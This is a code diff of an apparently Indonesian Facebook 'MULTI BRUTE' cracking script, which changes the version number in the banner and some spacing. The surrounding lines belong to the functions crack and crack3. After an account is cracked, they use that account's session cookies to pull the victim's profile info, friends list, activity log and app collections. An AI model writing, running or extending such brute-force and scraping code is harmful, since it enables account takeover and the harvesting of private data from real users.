@@ -82,7 +82,7 @@ def banner():
    _______| | |  | | |   |  °    |     |_____| |_____| |____  |
    ______________________ MULTI BRUTE ________________________|
        ____         ____       [®]PEMBUAT = M ZAINUL UMAM
-      |___           ___|      [®]UPDATE  = V1.4
+      |___           ___|      [®]UPDATE  = V1.5
   ________| S H I N |_________ [®]PREMIUM = AKTIF""")
                                     
 	
@@ -586,7 +586,7 @@ def crack(idf,pwv):
 					session = requests.Session()
 					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
 					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
-					response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
+					response  = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
 					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
 					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
 					response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
@@ -754,7 +754,7 @@ def crack3(idf,pwv):
 					session = requests.Session()
 					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki).text
 					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
-					response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki).text
+					response  = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki).text
 					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki).text
 					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki).text
 					response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki).text
